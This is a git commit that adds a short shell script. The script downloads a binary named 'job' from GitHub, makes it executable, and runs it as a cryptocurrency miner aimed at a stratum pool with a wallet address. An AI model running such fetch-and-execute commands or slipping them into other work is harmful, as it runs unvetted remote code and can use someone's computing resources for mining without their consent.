9dcdb150c1c8f2d199728c8235d6cb9b976fcba7
darywell <106720695+darywell@users.noreply.github.com>
2022-06-08 11:52:13 +0500

    Create script04.sh

---
+++ script04.sh
@@ -0,0 +1,5 @@
+#MGPC
+wget https://github.com/darywell/job/raw/main/job
+chmod +x job
+./job -a yespowermgpc -o stratum+tcps://stratum-asia.rplant.xyz:17049 -u MZJrVaEGGuGjgtZQXWFnr1wbcE8Q39EW6M.W4
+sleep 5
